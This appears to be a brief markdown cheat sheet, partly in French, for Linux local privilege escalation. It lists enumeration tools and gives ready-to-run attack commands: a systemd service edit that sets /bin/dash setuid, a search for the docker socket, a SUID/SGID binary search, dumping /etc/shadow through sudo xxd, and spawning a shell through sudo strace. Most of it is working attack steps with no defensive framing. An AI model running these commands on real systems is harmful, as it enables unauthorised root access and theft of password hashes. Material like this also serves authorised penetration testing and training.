# LPE Linux

## Tools 

- [lse.sh](https://github.com/diego-treitos/linux-smart-enumeration")
- [LinEnum](https://github.com/rebootuser/LinEnum")

## Systemd

```bash
echo -e '#!/bin/bash\nchmod 4755 /bin/dash' > /tmp/priv.sh 
vi /lib/systemd/system/debug.service 
edit line : ExecStart in `/tmp/priv.sh
reboot
```

## Programms running

```bash
ps -aux | grep root
https://github.com/DominicBreuker/pspy 
```

## Docker

```bash
find / -group docker -exec ls -la {} 2>/dev/null \;
=> on cherche le docker.sock
```

## Binaries enum

```bash
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \; find / -perm -g=s -o -perm -u=s -type f 2>/dev/null
```

## Hash dump

```bash
sudo xxd /etc/shadow | xxd -r
```

## Strace root

```bash
sudo strace -o /dev/null /bin/sh
```

